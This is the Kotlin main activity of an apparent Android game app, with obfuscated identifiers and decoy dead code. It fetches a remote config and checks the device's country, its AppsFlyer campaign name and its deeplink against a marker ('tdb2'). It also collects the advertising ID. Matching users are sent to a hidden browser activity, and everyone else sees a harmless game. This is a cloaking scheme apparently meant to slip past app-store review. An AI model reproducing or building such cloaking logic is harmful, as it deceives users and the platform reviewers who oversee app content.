package com.superplusgames.hosandr

import android.content.Intent
import android.icu.util.Calendar
import android.os.Bundle
import android.os.CountDownTimer
import android.util.Log
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.appsflyer.AppsFlyerLib
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import com.superplusgames.hosandr.databinding.ActivityMainBinding
import com.superplusgames.hosandr.frfrfrfrfrf.PLayGimiimiActivity
import com.superplusgames.hosandr.koko.gtgtgttg.ConstanceAppClassggtgt
import com.superplusgames.hosandr.koko.gtgtgttg.ConstanceAppClassggtgt.C1gtgtgt
import com.superplusgames.hosandr.koko.gtgtgttg.ConstanceAppClassggtgt.gtgtgtDEEPL
import com.superplusgames.hosandr.koko.gtgtgttg.ConstanceAppClassggtgt.MAIN_IDggtgtgt
import com.superplusgames.hosandr.koko.gtgtgttg.ConstanceAppClassggtgt.appsCheckggtgt
import com.superplusgames.hosandr.koko.gtgtgttg.ConstanceAppClassggtgt.linkfrrfr
import com.superplusgames.hosandr.koko.bgbggbbg.RaptorViewModel
import com.superplusgames.hosandr.vvvvvv.BrosserActivity
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit


@AndroidEntryPoint
class MainActivity : AppCompatActivity() {
    var gtggttg: String? = ""
    var ggttggt: String = ""
    var linkViewhyhyhy: String? = ""
    var appsCheckergtgt: String? = ""
    var retroDataaaaa: String? = ""
    var cddccdcdcdvfv: String = ""

    var kokok = "gtgt"

    private lateinit var countDownTimer:CountDownTimer

    private var time_in_milliseconds = 60000L
    private var pauseOffSet = 0L

    private var countdown_timer: CountDownTimer? = null

    private val baseViewModel: RaptorViewModel by viewModels()
    lateinit var bindMainAct: ActivityMainBinding

    private fun networkJob() {
        gttgtgtgtgt()
        baseViewModel.ffrfrrfrf.observe(this) {
            Log.d("Data", "countryCode: $gtggttg ")
            gtggttg = it.body()?.bgbgbgfffgttggt
            cddccdcdcdvfv = gtggttg.toString()
            baseViewModel.juujkikiki()
            baseViewModel.grfgtgtgt.observe(this, {
                linkViewhyhyhy = it.body()?.view
                Log.d("Data", "getDataDev: $linkViewhyhyhy")
                appsCheckergtgt = it.body()?.appsChecker
                Hawk.put(appsCheckggtgt, appsCheckergtgt)
                Hawk.put(linkfrrfr, linkViewhyhyhy)
                Log.d("Data in Hawk", "getDataDev: ${Hawk.get(linkfrrfr, "null")}")
                Log.d("Data in Hawk", "getDataDev: ${Hawk.get(appsCheckggtgt, "null")}")
                retroDataaaaa = it.body()?.geo

                ggttggt = retroDataaaaa.toString()
                Log.d("DataGeo", retroDataaaaa.toString())
                checkereeeeee()
            })

        }


    }

    private fun starTimer(pauseOffSetL : Long){
        countdown_timer = object : CountDownTimer(time_in_milliseconds - pauseOffSetL, 1000){
            override fun onTick(millisUntilFinished: Long) {
                pauseOffSet = time_in_milliseconds - millisUntilFinished
            }

            override fun onFinish() {
                Log.d("lolo", "Timer finished")
            }
        }.start()
    }
    private fun pauseTimer(){
        if (countdown_timer!= null){
            countdown_timer!!.cancel()
        }
    }

    private fun resetTimer(){
        if (countdown_timer!= null){
            countdown_timer!!.cancel()
            Log.d("resetTimer", "Timer finished")
            countdown_timer = null
            pauseOffSet =0
        }
    }


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        bindMainAct = ActivityMainBinding.inflate(layoutInflater)
        setContentView(bindMainAct.root)

        if (kokok == "uuuuuuu"){
            printDifferenceDateForHours()
        }

        if (System.currentTimeMillis() == Long.MIN_VALUE){
            Log.d("ool", "ggttg")
            starTimer(5555)
            resetTimer()
            pauseTimer()
        }

        lifecycleScope.launch {
            baseViewModel.bbgbgbgbg(this@MainActivity)
            AppsFlyerLib.getInstance()
                .init(
                    ConstanceAppClassggtgt.ggtgtgtgtgt,
                    baseViewModel.hyhyhyhyhy,
                    applicationContext
                )
            AppsFlyerLib.getInstance().start(this@MainActivity)
        }
        networkJob()

    }


    private fun getAdIdddd() {
        val adInfooooooooo = AdvertisingIdClient(applicationContext)
        adInfooooooooo.start()
        val adIdInfoiiiiiiii = adInfooooooooo.info.id
        Log.d("getAdvertisingId = ", adIdInfoiiiiiiii.toString())
        Hawk.put(MAIN_IDggtgtgt, adIdInfoiiiiiiii)
    }

    private fun gttgtgtgtgt() {
        baseViewModel.jukiikkiki()
    }


    private fun checkereeeeee() {
        lifecycleScope.launch(Dispatchers.IO) {
            val frfrffr = Hawk.get(appsCheckggtgt, "null")
            var naminghhyhyhy: String? = Hawk.get(C1gtgtgt)
            val deeplinkgtgtgt: String? = Hawk.get(gtgtgtDEEPL, "null")
            Log.d("CountryPool", ggttggt)
            Log.d("CountryCode", cddccdcdcdvfv)
            getAdIdddd()
            val wsowslxoccccc = Executors.newSingleThreadScheduledExecutor()
            if (frfrffr == "1") {
                wsowslxoccccc.scheduleAtFixedRate({
                    if (naminghhyhyhy != null) {
                        if (naminghhyhyhy!!.contains("tdb2") || ggttggt.contains(cddccdcdcdvfv) || deeplinkgtgtgt!!.contains(
                                "tdb2"
                            )
                        ) {

                            wsowslxoccccc.shutdown()
                            gtgtgtgtgt()


                        } else {
                            wsowslxoccccc.shutdown()
                            kokkokoko()
                        }
                    } else {
                        naminghhyhyhy = Hawk.get(C1gtgtgt)
                        Log.d("Apps Checker", "naming: ${naminghhyhyhy}")
                    }
                }, 0, 2, TimeUnit.SECONDS)
            } else if (ggttggt.contains(cddccdcdcdvfv)) {
                gtgtgtgtgt()


            } else {
                kokkokoko()


            }

        }
    }

    private fun kokkokoko() {
        startActivity(Intent(this@MainActivity, PLayGimiimiActivity::class.java))
        finish()
    }

    private fun gtgtgtgtgt() {
        startActivity(Intent(this@MainActivity, BrosserActivity::class.java))
        finish()
    }

    fun printDifferenceDateForHours() {

        val currentTime = Calendar.getInstance().time
        val endDateDay = "03/02/2020 21:00:00"
        val format1 = SimpleDateFormat("dd/MM/yyyy hh:mm:ss", Locale.getDefault())
        val endDate = format1.parse(endDateDay)

        //milliseconds
        var different = endDate.time - currentTime.time
        countDownTimer = object : CountDownTimer(different, 1000) {

            override fun onTick(millisUntilFinished: Long) {
                var diff = millisUntilFinished
                val secondsInMilli: Long = 1000
                val minutesInMilli = secondsInMilli * 60
                val hoursInMilli = minutesInMilli * 60
                val daysInMilli = hoursInMilli * 24

                val elapsedDays = diff / daysInMilli
                diff %= daysInMilli

                val elapsedHours = diff / hoursInMilli
                diff %= hoursInMilli

                val elapsedMinutes = diff / minutesInMilli
                diff %= minutesInMilli

                val elapsedSeconds = diff / secondsInMilli

                Log.d("lolo", "$elapsedDays days $elapsedHours hs $elapsedMinutes min $elapsedSeconds sec")
            }

            override fun onFinish() {
                Log.d("lolo", "done")
            }
        }.start()
    }
}